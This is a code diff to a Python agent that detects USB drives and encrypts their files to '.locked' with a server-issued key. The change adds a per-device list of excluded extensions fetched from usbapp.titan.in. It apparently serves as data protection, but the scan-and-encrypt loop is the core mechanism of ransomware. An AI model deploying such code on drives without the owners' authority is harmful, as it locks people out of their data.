@@ -20,7 +20,7 @@ load_dotenv()
 # Config
 SERVER_URL = "https://usbapp.titan.in"
 ENCRYPTED_EXT = ".locked"
-EXCLUDED_EXTENSIONS = [".exe", ".dll", ".sys", ".bat", ".cmd"]
+SYSTEM_EXTENSIONS = [".exe", ".dll", ".sys", ".bat", ".cmd"]
 
 # Request timeout and retry settings
 REQUEST_TIMEOUT = 30
@@ -85,7 +85,7 @@ def encrypt_usb(usb_path, key):
             filepath = os.path.join(root, file)
             if filepath.endswith(ENCRYPTED_EXT):
                 continue
-            if any(filepath.lower().endswith(ext) for ext in EXCLUDED_EXTENSIONS):
+            if any(filepath.lower().endswith(ext) for ext in SYSTEM_EXTENSIONS):
                 continue
             try:
                 encrypt_file(filepath, key)
@@ -96,7 +96,7 @@ def encrypt_usb(usb_path, key):
     return encrypted_count
 
 
-def get_files_to_encrypt(usb_path):
+def get_files_to_encrypt(usb_path, excluded_extensions=[]):
     """Get list of files to encrypt"""
     files_to_encrypt = []
     try:
@@ -105,12 +105,41 @@ def get_files_to_encrypt(usb_path):
                 filepath = os.path.join(root, file)
                 if filepath.endswith(ENCRYPTED_EXT):
                     continue
-                if any(filepath.lower().endswith(ext) for ext in EXCLUDED_EXTENSIONS):
+                if any(filepath.lower().endswith(ext) for ext in SYSTEM_EXTENSIONS):
                     continue
+                if excluded_extensions:  # If list is not empty
+                    if any(
+                        filepath.lower().endswith(ext) for ext in excluded_extensions
+                    ):
+                        continue
+
                 files_to_encrypt.append(filepath)
     except Exception as e:
         print(f"[⚠️] Error scanning files in {usb_path}: {e}")
     return files_to_encrypt
+
+
+def get_excluded_extensions(device_id):
+    """Get excluded file extensions from server"""
+    try:
+        response = requests.post(
+            f"{SERVER_URL}/get_excluded_extensions",
+            json={"usb_serial_hash": device_id},
+            headers={
+                "Content-Type": "application/json",
+                "Accept": "application/json",
+            },
+            timeout=10,
+        )
+
+        if response.status_code == 200:
+            result = response.json()
+            return result.get("excluded_extensions", [])
+
+    except Exception as e:
+        print(f"[⚠️] Could not fetch excluded extensions: {e}")
+
+    return []  # Return empty list (allow all) on error
 
 
 def get_encryption_key_online(device_id, machine_id, files):
@@ -383,15 +412,28 @@ def main():
                         print(
                             f"[🔄] USB {drive} - Scanning for new files to encrypt..."
                         )
+                        device_id = drive_state["device_id"]
 
-                        files_to_encrypt = get_files_to_encrypt(drive)
+                        excluded_extensions = get_excluded_extensions(
+                            device_id=device_id
+                        )
+
+                        if excluded_extensions:
+                            print(
+                                f"[🔒] Extension restrictions: {', '.join(excluded_extensions)}"
+                            )
+                        else:
+                            print(f"[✅] All file types allowed")
+
+                        files_to_encrypt = get_files_to_encrypt(
+                            drive, excluded_extensions=excluded_extensions
+                        )
 
                         if files_to_encrypt:
                             print(
                                 f"[📂] USB {drive} - Found {len(files_to_encrypt)} new files"
                             )
 
-                            device_id = drive_state["device_id"]
                             machine_id = get_machine_id()
 
                             # Use existing key or get new one
@@ -451,6 +493,7 @@ def main():
                     print(f"[🆕] USB Detected: {drive}")
 
                     device_id = get_usb_hardware_serial(drive)
+                    excluded_extensions = get_excluded_extensions(device_id=device_id)
                     if not device_id:
                         print(
                             f"[⚠️] USB {drive} - Could not get hardware serial, skipping..."
@@ -462,7 +505,9 @@ def main():
                     print(f"[🧬] USB {drive} - Serial Hash: {device_id[:16]}...")
                     print(f"[🖥️] USB {drive} - Machine ID: {machine_id}")
 
-                    files_to_encrypt = get_files_to_encrypt(drive)
+                    files_to_encrypt = get_files_to_encrypt(
+                        drive, excluded_extensions=excluded_extensions
+                    )
                     print(
                         f"[📂] USB {drive} - Found {len(files_to_encrypt)} files to encrypt"
                     )
